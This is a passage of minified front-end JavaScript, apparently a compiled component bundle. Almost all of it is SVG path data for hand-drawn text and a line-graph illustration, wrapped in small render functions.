1.75-.2.433-.366 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.567.133 5.267.333 5.1.6-.133.267-1.9.4-5.3.4h-5.25l-3.75-3.65v-4.35c0-3.1.317-5.267.95-6.5.634-1.233 1.867-2.067 3.7-2.5Zm-174.38 58.25c.666-.267 1.533-.367 2.6-.3 1.1.033 2.016.233 2.75.6.933.433 1.466.8 1.6 1.1.133.3-.067.717-.6 1.25-.4.433-.65 1-.75 1.7-.067.667-.067 2.367 0 5.1.1 3.933.366 5.933.8 6 .2.033.533-.3 1-1 .033-.1.083-.2.15-.3.6-.967 1.066-1.333 1.4-1.1.2.167.216.6.05 1.3-.4 1.667-1.334 2.5-2.8 2.5-.834 0-1.434-.183-1.8-.55-.334-.367-.5-.967-.5-1.8 0-.9-.084-1.35-.25-1.35-.167 0-1.017.683-2.55 2.05-1.034.9-1.9 1.483-2.6 1.75-.667.267-1.167.317-1.5.15a21.588 21.588 0 0 0-1.5-.65 4.847 4.847 0 0 0-2.1-.45c-.6 0-1.017-.083-1.25-.25-.234-.167-.484-.567-.75-1.2-.767-1.767-.784-4.467-.05-8.1.233-1.233.466-2.083.7-2.55.266-.5.733-1.05 1.4-1.65.733-.6 1.483-1.017 2.25-1.25a11.43 11.43 0 0 1 2.35-.55c.833-.133 1.483-.283 1.95-.45Zm4.95 1.3c-.134-.233-.934-.367-2.4-.4-1.434-.067-2.267 0-2.5.2-.067.1-.867.317-2.4.65-1.5.3-2.634.733-3.4 1.3-.567.433-.967.883-1.2 1.35-.2.433-.4 1.2-.6 2.3-.3 1.767-.45 3.417-.45 4.95 0 1.533.166 2.4.5 2.6.5.3 1.416.667 2.75 1.1 1.366.433 2.283.65 2.75.65.6 0 1.516-.733 2.75-2.2 1.266-1.5 1.9-2.6 1.9-3.3 0-.333.033-.583.1-.75.1-.2.2-.367.3-.5.133-.133.283-.5.45-1.1.166-.6.3-1.4.4-2.4.133-.933.283-1.733.45-2.4.166-.667.3-1.067.4-1.2.1-.133.183-.3.25-.5.066-.2.05-.317-.05-.35Zm9.087-1.4c0-1.2.2-2.467.6-3.8.433-1.367.65-2.783.65-4.25 0-1.833.083-2.833.25-3 .2-.167.433-.167.7 0 .266.167.283 1.433.05 3.8-.2 2.367-.467 3.817-.8 4.35-.367.533-.584 1.817-.65 3.85l-.15 3.1 2.7.25c1.8.167 3.133.483 4 .95.566.3.916.583 1.05.85.166.267.25.85.25 1.75 0 1.033-.217 2.067-.65 3.1-.4 1-.6 1.767-.6 2.3 0 .7-.417 1.633-1.25 2.8-.8 1.133-1.517 1.783-2.15 1.95-.634.133-1.617.167-2.95.1l-2.05-.15-.05-11.9-1.55-.1c-.967-.067-1.417-.267-1.35-.6.066-.333.583-.567 1.55-.7.9-.133 1.516-.55 1.85-1.25.366-.7.55-1.833.55-3.4Zm6.9 6.1c-.1-.033-.634-.1-1.6-.2a27.058 27.058 0 0 0-2.95-.25c-1-.033-1.584.083-1.75.35-.1.333-.184 2.2-.25 5.6l-.1 5.15 1.7.1c.633.033 1.133 0 1.5-.1.4-.1.8-.333 1.2-.7.466-.433.916-1.183 1.35-2.25a19.758 19.758 0 0 0 1-3.2c.266-1.1.4-2.1.4-3 0-.9-.167-1.4-.5-1.5Zm7.023-13.4c.133-.133 1.533-.15 4.2-.05 2.866.1 4.966.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.084 2.917-.25 3.35-.134.433-.684 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.334-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.166-1.583 2.3-1.75c.766-.067 1.416-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.516.183 1.85.55.333.4.283.65-.15.75-.367.133-1.384.283-3.05.45-.667.033-1.167.067-1.5.1-.334.033-.7.133-1.1.3-.4.133-.684.25-.85.35-.167.1-.35.333-.55.7-.167.333-.284.65-.35.95-.034.267-.084.75-.15 1.45-.067.7-.1 1.35-.1 1.95v7.4l1.25 1.2c.6.567 1.166.917 1.7 1.05.566.133 1.966.233 4.2.3l4.7.15 1.75-1.95c1.066-1.167 1.716-2.1 1.95-2.8.233-.733.366-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.134-.8-.284-1.317-.45-1.55a12.742 12.742 0 0 1-.65-1.05c-.234-.5-.417-1.133-.55-1.9-.167-1-.484-1.6-.95-1.8-.434-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.034-.1.016-.2.15-.3ZM179.102 296c0-1.667.016-2.967.05-3.9.033-.967.083-1.783.15-2.45.066-.667.166-1.1.3-1.3.133-.2.3-.233.5-.1.233.133.316 1.183.25 3.15-.067 1.933-.134 3.9-.2 5.9-.067 2 .083 3.7.45 5.1.033.067.066.15.1.25.2.6.416 1.033.65 1.3.266.233.9.433 1.9.6 1 .167 2.566.25 4.7.25.766 0 1.383-.017 1.85-.05.466-.033.9-.133 1.3-.3.433-.167.75-.367.95-.6.2-.233.383-.617.55-1.15.2-.533.333-1.1.4-1.7.1-.6.216-1.433.35-2.5.3-2.933.283-4.667-.05-5.2-.2-.267-.35-.667-.45-1.2-.067-.533-.084-1-.05-1.4.066-.4.2-.6.4-.6.533 0 .883.467 1.05 1.4.2.9.283 2.7.25 5.4l-.05 5.5-3.1 3.8-4.65-.3a95.794 95.794 0 0 1-2.45-.1 23.713 23.713 0 0 1-1.85-.3c-.634-.167-1.1-.317-1.4-.45-.267-.133-.567-.4-.9-.8-.3-.433-.5-.817-.6-1.15-.067-.333-.15-.9-.25-1.7-.1-.833-.15-1.6-.15-2.3V296Zm28.956-8.55c.5-1.067.9-1.45 1.2-1.15.2.333.266.65.2.95-.067.267-.2.617-.4 1.05-.2.4-.3.667-.3.8 0 .1 1 .15 3 .15 2.033 0 3.216.2 3.55.6.5.6.183.917-.95.95-.567.033-1.4 0-2.5-.1-1.567-.133-2.5-.167-2.8-.1-.267.067-.5.367-.7.9-.267.733-.4 2.867-.4 6.4 0 3.3.183 5.15.55 5.55.266.267.833.217 1.7-.15.633-.3 1.05-.317 1.25-.05.233.367.116.733-.35 1.1-.467.333-1.05.5-1.75.5-.834 0-1.434-.2-1.8-.6-.367-.4-.6-1.133-.7-2.2-.1-1.067-.134-2.833-.1-5.3l.15-6.05-5.75-.2c-3.934-.133-5.817-.35-5.65-.65.166-.267 2.133-.467 5.9-.6l5.9-.2.75-1.6Zm35.541 21.5c.366 0 .716-.133 1.05-.4.333-.3 1.016-.45 2.05-.45 2.333 0 3.766-1.15 4.3-3.45.3-1.333.416-3.15.35-5.45-.034-2.333-.217-3.917-.55-4.75l-.6-1.5h-3.45c-2.3 0-3.6-.183-3.9-.55-.334-.4-.367-1.25-.1-2.55.3-1.3.733-2.267 1.3-2.9.4-.433.783-.7 1.15-.8.366-.1 1-.133 1.9-.1 1.366.1 2.05.35 2.05.75s-.684.65-2.05.75c-1.167.067-1.967.3-2.4.7-.434.4-.65 1.1-.65 2.1v1.35h3.2c1.6 0 2.683.117 3.25.35.6.233.9.65.9 1.25 0 .367.266.9.8 1.6.766.967 1.033 2.783.8 5.45-.234 2.667-.867 4.933-1.9 6.8-.6 1.1-2.767 1.983-6.5 2.65-3.234.533-5.017.267-5.35-.8-.034-.133-.267-.683-.7-1.65-.434-.967-.734-1.9-.9-2.8-.1-.7-.117-1.183-.05-1.45.066-.267.266-.5.6-.7 1.333-.7 2.533-.517 3.6.55.433.433.7.867.8 1.3.133.433.2 1.167.2 2.2 0 1.1.05 1.8.15 2.1.1.267.316.4.65.4Zm-2.4-2.65c-.1-1.433-.267-2.283-.5-2.55a1.243 1.243 0 0 0-.9-.5c-.334-.067-.6 0-.8.2-.234.233-.234.867 0 1.9.266 1.033.616 1.867 1.05 2.5.533.767.883 1.067 1.05.9.2-.2.233-1.017.1-2.45Zm17.553-19.5c.766-.2 1.833-.25 3.2-.15 1.4.067 2.233.233 2.5.5.266.267.466.983.6 2.15.1.8.066 1.4-.1 1.8-.134.367-.5.9-1.1 1.6-.567.633-1.084 1.083-1.55 1.35-.434.233-1.117.433-2.05.6-2 .3-2.934.117-2.8-.55 0-.067.033-.167.1-.3.2-.3.933-.45 2.2-.45.733 0 1.3-.067 1.7-.2.433-.167.883-.467 1.35-.9.6-.567.966-1.283 1.1-2.15.133-.867-.017-1.533-.45-2-.567-.567-1.884-.633-3.95-.2-2.067.4-3.25.983-3.55 1.75-.2.433-.367 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.566.133 5.266.333 5.1.6-.134.267-1.9.4-5.3.4h-5.25l-3.75-3.65v-4.35c0-3.1.316-5.267.95-6.5.633-1.233 1.866-2.067 3.7-2.5Zm12.533-4.7c.133-.433.25-.9.35-1.4.133-.5.216-.867.25-1.1.066-.267.133-.517.2-.75.1-.233.183-.4.25-.5.1-.1.2-.15.3-.15.166 0 .25.133.25.4 0 .233-.05.733-.15 1.5-.034.333-.067.617-.1.85-.034.233-.084.567-.15 1-.034.4-.084.85-.15 1.35-.034.467-.084.95-.15 1.45a46.257 46.257 0 0 1-.6 4.5c-.267 1.4-.467 3-.6 4.8-.134 1.767-.234 4.583-.3 8.45-.067 4.133-.084 6.733-.05 7.8.066 1.067.25 1.65.55 1.75.466.2 1.016-.033 1.65-.7.633-.667 1.1-1.5 1.4-2.5.5-1.5.833-2.25 1-2.25.066 0 .166.067.3.2.366.367.316 1.133-.15 2.3a12.33 12.33 0 0 1-1.95 3.2c-.834 1.033-1.534 1.55-2.1 1.55-.2 0-.45-.1-.75-.3a2.565 2.565 0 0 1-.65-.7c-.267-.4-.434-1.183-.5-2.35-.067-1.167-.067-3.617 0-7.35.1-4.267.316-8.433.65-12.5.366-4.067.766-6.917 1.2-8.55Zm7.422 0c.133-.433.25-.9.35-1.4.133-.5.216-.867.25-1.1.066-.267.133-.517.2-.75.1-.233.183-.4.25-.5.1-.1.2-.15.3-.15.166 0 .25.133.25.4 0 .233-.05.733-.15 1.5-.034.333-.067.617-.1.85-.034.233-.084.567-.15 1-.034.4-.084.85-.15 1.35-.034.467-.084.95-.15 1.45a46.257 46.257 0 0 1-.6 4.5c-.267 1.4-.467 3-.6 4.8-.134 1.767-.234 4.583-.3 8.45-.067 4.133-.084 6.733-.05 7.8.066 1.067.25 1.65.55 1.75.466.2 1.016-.033 1.65-.7.633-.667 1.1-1.5 1.4-2.5.5-1.5.833-2.25 1-2.25.066 0 .166.067.3.2.366.367.316 1.133-.15 2.3a12.33 12.33 0 0 1-1.95 3.2c-.834 1.033-1.534 1.55-2.1 1.55-.2 0-.45-.1-.75-.3a2.565 2.565 0 0 1-.65-.7c-.267-.4-.434-1.183-.5-2.35-.067-1.167-.067-3.617 0-7.35.1-4.267.316-8.433.65-12.5.366-4.067.766-6.917 1.2-8.55Zm5.572 18.55c-.067-4.433-.067-7.233 0-8.4.066-1.167.233-1.75.5-1.75.266 0 .433.55.5 1.65.066 1.1.1 3.7.1 7.8v4.6c.033 1.167.066 2.117.1 2.85.066.733.133 1.233.2 1.5.066.267.15.383.25.35.233-.067.583-.517 1.05-1.35.5-.833.866-1.633 1.1-2.4.133-.533.333-.667.6-.4.366.367.35 1.05-.05 2.05-.367 1-.934 1.9-1.7 2.7-.734.8-1.367 1.15-1.9 1.05-.3-.067-.5-.667-.6-1.8-.067-1.133-.117-3.95-.15-8.45Zm2.55-19.15c-.4 0-.6-.133-.6-.4 0-.3.2-.45.6-.45.4 0 .6.15.6.45 0 .267-.2.4-.6.4Zm5.112 20.05c.167 0 .517-.367 1.05-1.1a18.899 18.899 0 0 1 1.85-2.25c.7-.767 1.367-1.15 2-1.15.667 0 1.65.65 2.95 1.95.934.967 1.5 1.683 1.7 2.15.234.433.417 1.383.55 2.85.2 1.967.567 3.217 1.1 3.75.5.533.9.783 1.2.75.3-.067.584-.433.85-1.1.367-.933.634-1.55.8-1.85.2-.333.434-.55.7-.65.4-.133.534.133.4.8-.266 1.167-.85 2.283-1.75 3.35-.366.467-.683.7-.95.7-.9 0-1.65-.55-2.25-1.65-.566-1.133-1.183-3.183-1.85-6.15-.133-.6-.666-1.35-1.6-2.25-.933-.933-1.65-1.4-2.15-1.4-.733 0-1.683 1-2.85 3-1.133 1.967-1.783 3.733-1.95 5.3-.2 2-.433 3-.7 3-.1 0-.25-.083-.45-.25-.433-.333-.65-2.083-.65-5.25s.217-5.55.65-7.15c.4-1.6.6-2.783.6-3.55 0-.767.084-1.233.25-1.4.434-.4.717-.233.85.5.067.4.05.883-.05 1.45-.166 1.067-.3 2.2-.4 3.4-.1 1.2-.15 2.2-.15 3 .034.8.117 1.2.25 1.2Zm28.113 5.95c0-.5.2-.983.6-1.45.4-.467.6-.933.6-1.4 0-.367-.183-.65-.55-.85-.366-.233-1.2-.55-2.5-.95-2.066-.6-3.683-.9-4.85-.9-1.266 0-2.45-.4-3.55-1.2-1.1-.833-1.65-1.733-1.65-2.7 0-.467.917-1.633 2.75-3.5 1.867-1.867 3.017-2.817 3.45-2.85.367 0 .967-.267 1.8-.8.634-.433 1.117-.65 1.45-.65.367 0 1.2.25 2.5.75.767.267 1.55.733 2.35 1.4.834.633 1.25 1.117 1.25 1.45 0 .433-.683.217-2.05-.65a6.327 6.327 0 0 0-.7-.5c-1.233-.9-2.616-1.133-4.15-.7-1.533.4-3.316 1.517-5.35 3.35-.966.867-1.566 1.483-1.8 1.85-.2.333-.25.733-.15 1.2.167.633.634 1.183 1.4 1.65.8.467 1.65.7 2.55.7.867 0 1.784.2 2.75.6.9.367 1.934.567 3.1.6 1.167.033 1.934-.117 2.3-.45.3-.333.45-1.433.45-3.3 0-2.3.317-3.333.95-3.1.167.033.367.2.6.5.3.433.467 1.25.5 2.45.067 1.2-.05 1.883-.35 2.05-.233.133-.4.567-.5 1.3-.1.7-.3 1.667-.6 2.9-.3 1.233-.783 2.4-1.45 3.5-.766 1.333-1.15 2.1-1.15 2.3 0 .233-.533.917-1.6 2.05-.733.8-1.283 1.283-1.65 1.45-.333.167-.9.217-1.7.15-.866-.033-1.416-.167-1.65-.4-.2-.2-.5-.85-.9-1.95a35.698 35.698 0 0 0-.6-1.75c-.2-.667-.35-1.117-.45-1.35a6.034 6.034 0 0 0-.3-.8 5.16 5.16 0 0 0-.5-.95c-.433-.633-.5-1.1-.2-1.4.3-.3.55-.183.75.35.034.1.334.783.9 2.05.567 1.233.934 2.267 1.1 3.1.2 1 .484 1.65.85 1.95.4.367 1.084.317 2.05-.15.967-.467 1.634-1.05 2-1.75.234-.467.6-1 1.1-1.6.534-.6.8-1.133.8-1.6Zm26.839-2.25c.566-.467.95-.717 1.15-.75.2-.033.516.067.95.3.4.267.45.633.15 1.1-.834 1.4-1.667 1.683-2.5.85-.367-.333-.534-.567-.5-.7.033-.167.283-.433.75-.8Zm.65-15.8c.566-.433 1.116-.6 1.65-.5.533.1.8.4.8.9 0 .533-.367.9-1.1 1.1-.734.2-1.267.083-1.6-.35-.234-.233-.334-.417-.3-.55.033-.167.216-.367.55-.6Zm21.934-3.2c.233-.533.633-1.183 1.2-1.95.566-.8.95-1.2 1.15-1.2.433 0 .416.433-.05 1.3-1 1.667-1.584 2.683-1.75 3.05-.334.733-.734 1.333-1.2 1.8-.434.433-.65.767-.65 1 0 .3-.417 1-1.25 2.1-.834 1.1-1.317 1.883-1.45 2.35-.3.967-1.35 2.733-3.15 5.3-1.8 2.533-3.034 4.017-3.7 4.45-.234.167-.517.583-.85 1.25-1.434 2.7-2.767 4.933-4 6.7-1.234 1.8-2.067 2.7-2.5 2.7-.4 0-.417-.317-.05-.95.4-.6 1.05-1.55 1.95-2.85.9-1.267 1.6-2.4 2.1-3.4a24.616 24.616 0 0 1 3.55-5.25c1.466-1.633 2.483-2.883 3.05-3.75l1.85-2.75c.5-.733.75-1.367.75-1.9 0-.567.15-.95.45-1.15.233-.133.983-1.15 2.25-3.05 1.3-1.933 2.066-3.2 2.3-3.8Z",
        },
        null,
        -1
    ),
    Ka = [Va, ja];
function qa(r, e) {
    return p1(), Y1("svg", Xa, Ka);
}
const Qa = { render: qa },
    Ga = {
        xmlns: "http://www.w3.org/2000/svg",
        fill: "none",
        viewBox: "0 0 291 662",
    },
    Ja = jo(
        '<path stroke="#000" d="m43.718 634 11.697-31.358 25.133 12.959 6.705-86.299 19.393 43.889 31.668-138.901 17.261 40.808 9.728-29.574 12.568 52.977 14.654-77.105 10.522 36.799 33.923-154.593L289.236 9.871"></path><path stroke="#000" d="M0-.5h49.9" transform="matrix(.99494 .10048 .3681 .92979 56 634)"></path><path fill="#000" d="m111.065 625.28.32-.84.48.72c.24.347.546.56.92.64.4.08.866.147 1.4.2.533.027 1 .16 1.4.4.373.187 1 .347 1.88.48.88.107 1.733.44 2.56 1 .72.507 1.146.88 1.28 1.12.133.24.2.827.2 1.76 0 1.253-.2 2.187-.6 2.8-.48.72-1.12 1.373-1.92 1.96-.8.587-1.534.933-2.2 1.04-1.92.373-1.694.747.68 1.12.266.053.56.107.88.16.72.08 1.373.36 1.96.84.586.48 1.16 1.213 1.72 2.2l.84 1.4-.68 2.28c-.454 1.493-.694 2.387-.72 2.68 0 .453-.36 1.013-1.08 1.68-.694.64-1.374 1.04-2.04 1.2a7.552 7.552 0 0 0-2.48 1.16l-1.84 1.36c-.507.373-.854.467-1.04.28-.134-.133-.28-1.707-.44-4.72-.134-3.013-.294-6.293-.48-9.84-.16-3.547-.347-5.84-.56-6.88-.32-1.653-.507-2.8-.56-3.44-.054-.453-.147-.72-.28-.8-.107-.107-.414-.133-.92-.08-.694.053-1.04-.04-1.04-.28 0-.24.333-.427 1-.56.693-.133 1.146-.48 1.36-1.04Zm8.72 3.52c-.694-.64-2.054-1.173-4.08-1.6-2-.427-3.174-.453-3.52-.08-.214.213-.267 1.093-.16 2.64.133 1.52.373 2.907.72 4.16.133.48.226.813.28 1 .053.187.133.413.24.68.133.267.213.44.24.52.053.08.16.16.32.24.186.08.32.12.4.12.106-.027.306-.067.6-.12.32-.08.573-.16.76-.24.213-.08.546-.2 1-.36 2.346-.88 3.626-2.427 3.84-4.64.053-.693.04-1.173-.04-1.44-.054-.267-.254-.56-.6-.88Zm-1.52 9.96a12.845 12.845 0 0 0-3.28-.4h-1.8l.16 6.4c.106 4.267.226 6.467.36 6.6.106.08.293.027.56-.16.266-.213.56-.44.88-.68.32-.24.56-.36.72-.36.32 0 1-.28 2.04-.84 1.04-.56 1.72-1.013 2.04-1.36.4-.453.76-1.187 1.08-2.2.32-1.013.48-1.947.48-2.8 0-2.24-1.08-3.64-3.24-4.2Zm5.401-6c0-.427.093-.64.28-.64.186 0 .626.533 1.32 1.6.693 1.04 1.04 1.707 1.04 2 0 .56.226.533.68-.08.213-.267.44-.64.68-1.12.906-1.787 1.6-1.933 2.08-.44.16.453.32.773.48.96.186.16.453.267.8.32.613.08 1.04 0 1.28-.24.266-.267.48-.373.64-.32.16.053.24.253.24.6 0 .4-.214.72-.64.96-.4.24-.934.36-1.6.36-.427 0-.8-.107-1.12-.32-.32-.24-.534-.48-.64-.72-.107-.24-.267-.4-.48-.48-.187-.107-.387-.04-.6.2-.32.32-.574 1.653-.76 4-.16 2.347-.32 3.693-.48 4.04-.187.32-.32.96-.4 1.92-.08.96-.174 1.813-.28 2.56-.107.72-.294 1.08-.56 1.08-.214 0-.347-.44-.4-1.32-.054-.88-.08-2.88-.08-6 0-4.427-.094-6.853-.28-7.28-.054-.213-.214-.4-.48-.56a1.748 1.748 0 0 1-.52-.48c-.134-.24-.2-.44-.2-.6Zm13.712-2.64c.107-.107 1.227-.12 3.36-.04 2.293.08 3.973.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.067 2.333-.2 2.68-.107.347-.547.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.267-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.933-1.267 1.84-1.4.613-.053 1.133-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.213.147 1.48.44.267.32.227.52-.12.6-.293.107-1.107.227-2.44.36-.533.027-.933.053-1.2.08-.267.027-.56.107-.88.24-.32.107-.547.2-.68.28-.133.08-.28.267-.44.56a3.33 3.33 0 0 0-.28.76c-.027.213-.067.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.933.733 1.36.84.453.107 1.573.187 3.36.24l3.76.12 1.4-1.56c.853-.933 1.373-1.68 1.56-2.24.187-.587.293-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.107-.64-.227-1.053-.36-1.24a10.642 10.642 0 0 1-.52-.84c-.187-.4-.333-.907-.44-1.52-.133-.8-.387-1.28-.76-1.44-.347-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.027-.08.013-.16.12-.24Zm12.108-4.64c0-.373.093-.547.28-.52.293.053.493.373.6.96a.35.35 0 0 1 .04.16c.053.533.173 1.213.36 2.04.213.8.373 1.853.48 3.16.133 1.307.2 3.093.2 5.36 0 3.467.16 5.413.48 5.84.24.32.427.453.56.4.133-.053.44-.36.92-.92.427-.48.813-1.08 1.16-1.8a73.68 73.68 0 0 1 .84-1.76c.213-.453.4-.68.56-.68.107 0 .173.04.2.12.053.053.067.173.04.36 0 .187-.04.44-.12.76-.053.293-.147.693-.28 1.2-.08.293-.4.747-.96 1.36a52.763 52.763 0 0 1-1.64 1.72c-.507.507-.76.8-.76.88 0 .053.12.107.36.16.24.027.547.16.92.4.373.213.667.573.88 1.08.213.507.413.827.6.96.187.107.587.16 1.2.16.907 0 1.56-.173 1.96-.52.32-.24.573-.36.76-.36.213-.027.307.08.28.32 0 .213-.147.467-.44.76-.293.32-.6.533-.92.64-.32.107-.827.16-1.52.16-.8 0-1.32-.053-1.56-.16-.24-.133-.52-.467-.84-1-.427-.693-.867-1.067-1.32-1.12-.453-.053-.813.24-1.08.88-.213.587-.253 1.613-.12 3.08.187 1.867.053 3-.4 3.4a.363.363 0 0 1-.4 0c-.213-.133-.32-1.307-.32-3.52 0-1.307-.04-2.227-.12-2.76-.08-.533-.227-.92-.44-1.16-.24-.267-.36-.467-.36-.6 0-.133.12-.333.36-.6.24-.267.387-.84.44-1.72.08-.907.12-2.88.12-5.92 0-4.667-.173-7.6-.52-8.8-.32-1.2-.48-2-.48-2.4Zm14.423 7.96c.613-.16 1.467-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44 0-.053.027-.133.08-.24.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.347-.133.707-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.013-1.227-.36-1.6-.453-.453-1.507-.507-3.16-.16-1.653.32-2.6.787-2.84 1.4-.16.347-.293 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.507-.987 1.493-1.653 2.96-2Zm25.904 14.76c.453-.373.76-.573.92-.6.16-.027.413.053.76.24.32.213.36.507.12.88-.667 1.12-1.334 1.347-2 .68-.294-.267-.427-.453-.4-.56.026-.133.226-.347.6-.64Zm.52-12.64c.453-.347.893-.48 1.32-.4.426.08.64.32.64.72 0 .427-.294.72-.88.88-.587.16-1.014.067-1.281-.28-.186-.187-.266-.333-.239-.44.026-.133.173-.293.44-.48Zm8.427-7.4c1.013-.64 1.613-.853 1.8-.64.213.213.226.44.04.68-.16.213-.414.32-.76.32-.267 0-.894.48-1.88 1.44-.96.96-1.84 1.973-2.64 3.04-.747 1.013-1.214 2.8-1.4 5.36-.16 2.56.053 4.6.64 6.12a29.356 29.356 0 0 0 1.84 4.04c.72 1.227 1.32 2 1.8 2.32.586.427 1.6.72 3.04.88 1.386.16 2.066.36 2.04.6-.027.213-.667.293-1.92.24-1.494-.08-2.627-.347-3.4-.8-.747-.48-1.48-1.387-2.2-2.72-.694-1.253-1.174-2.267-1.44-3.04-.24-.8-.48-1.373-.72-1.72-.347-.533-.52-2.12-.52-4.76 0-1.733.04-2.907.12-3.52.08-.613.293-1.227.64-1.84a19.149 19.149 0 0 1 2.36-3.56c.933-1.12 1.786-1.933 2.56-2.44ZM3.966 433.56c.427-1.387.76-3.053 1-5 .24-1.973.427-3.52.56-4.64.133-1.12.333-1.68.6-1.68.293 0 .44.267.44.8 0 1.013-.147 2.533-.44 4.56-.267 2-.507 3.253-.72 3.76-.32.72-.48 1.387-.48 2 0 .4-.053.76-.16 1.08-.107.293-.227.56-.36.8-.107.24-.227.747-.36 1.52-.107.747-.173 1.733-.2 2.96l-.04 3.32 2.28-.08c1.547-.08 3.04-.28 4.48-.6 1.2-.267 2.267-.387 3.2-.36.96.027 1.493.187 1.6.48.053.16-.08.267-.4.32-.293.053-.813.08-1.56.08-1.04 0-2.333.187-3.88.56-1.547.347-3.013.533-4.4.56l-2.64.04.12-2.12c.16-3.2.613-5.987 1.36-8.36Zm15.912-4.12c.613-.16 1.466-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44 0-.053.026-.133.08-.24.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.346-.133.706-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.014-1.227-.36-1.6-.454-.453-1.507-.507-3.16-.16-1.654.32-2.6.787-2.84 1.4-.16.347-.294 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.506-.987 1.493-1.653 2.96-2Zm13.346 17.72c.294 0 .574-.107.84-.32.267-.24.814-.36 1.64-.36 1.867 0 3.014-.92 3.44-2.76.24-1.067.334-2.52.28-4.36-.026-1.867-.173-3.133-.44-3.8l-.48-1.2h-2.76c-1.84 0-2.88-.147-3.12-.44-.266-.32-.293-1-.08-2.04.24-1.04.587-1.813 1.04-2.32.32-.347.627-.56.92-.64.294-.08.8-.107 1.52-.08 1.094.08 1.64.28 1.64.6 0 .32-.546.52-1.64.6-.933.053-1.573.24-1.92.56-.346.32-.52.88-.52 1.68v1.08h2.56c1.28 0 2.147.093 2.6.28.48.187.72.52.72 1 0 .293.214.72.64 1.28.614.773.827 2.227.64 4.36-.186 2.133-.693 3.947-1.52 5.44-.48.88-2.213 1.587-5.2 2.12-2.586.427-4.013.213-4.28-.64-.026-.107-.213-.547-.56-1.32a9.893 9.893 0 0 1-.72-2.24c-.08-.56-.093-.947-.04-1.16.054-.213.214-.4.48-.56 1.067-.56 2.027-.413 2.88.44.347.347.56.693.64 1.04.107.347.16.933.16 1.76 0 .88.04 1.44.12 1.68.08.213.254.32.52.32Zm-1.92-2.12c-.08-1.147-.213-1.827-.4-2.04a.995.995 0 0 0-.72-.4c-.266-.053-.48 0-.64.16-.186.187-.186.693 0 1.52.214.827.494 1.493.84 2 .427.613.707.853.84.72.16-.16.187-.813.08-1.96Zm15.163 2.12c.293 0 .573-.107.84-.32.266-.24.813-.36 1.64-.36 1.866 0 3.013-.92 3.44-2.76.24-1.067.333-2.52.28-4.36-.027-1.867-.174-3.133-.44-3.8l-.48-1.2h-2.76c-1.84 0-2.88-.147-3.12-.44-.267-.32-.294-1-.08-2.04.24-1.04.586-1.813 1.04-2.32.32-.347.626-.56.92-.64.293-.08.8-.107 1.52-.08 1.093.08 1.64.28 1.64.6 0 .32-.547.52-1.64.6-.934.053-1.574.24-1.92.56-.347.32-.52.88-.52 1.68v1.08h2.56c1.28 0 2.146.093 2.6.28.48.187.72.52.72 1 0 .293.213.72.64 1.28.613.773.826 2.227.64 4.36-.187 2.133-.694 3.947-1.52 5.44-.48.88-2.214 1.587-5.2 2.12-2.587.427-4.014.213-4.28-.64-.027-.107-.214-.547-.56-1.32a9.893 9.893 0 0 1-.72-2.24c-.08-.56-.094-.947-.04-1.16.053-.213.213-.4.48-.56 1.066-.56 2.026-.413 2.88.44.346.347.56.693.64 1.04.106.347.16.933.16 1.76 0 .88.04 1.44.12 1.68.08.213.253.32.52.32Zm-1.92-2.12c-.08-1.147-.214-1.827-.4-2.04a.995.995 0 0 0-.72-.4c-.267-.053-.48 0-.64.16-.187.187-.187.693 0 1.52.213.827.493 1.493.84 2 .426.613.706.853.84.72.16-.16.186-.813.08-1.96Zm30.279-13.08c0-.96.16-1.973.48-3.04a11.18 11.18 0 0 0 .52-3.4c0-1.467.066-2.267.2-2.4.16-.133.346-.133.56 0 .213.133.226 1.147.04 3.04-.16 1.893-.374 3.053-.64 3.48-.294.427-.467 1.453-.52 3.08l-.12 2.48 2.16.2c1.44.133 2.506.387 3.2.76.453.24.733.467.84.68.133.213.2.68.2 1.4 0 .827-.174 1.653-.52 2.48-.32.8-.48 1.413-.48 1.84 0 .56-.334 1.307-1 2.24-.64.907-1.214 1.427-1.72 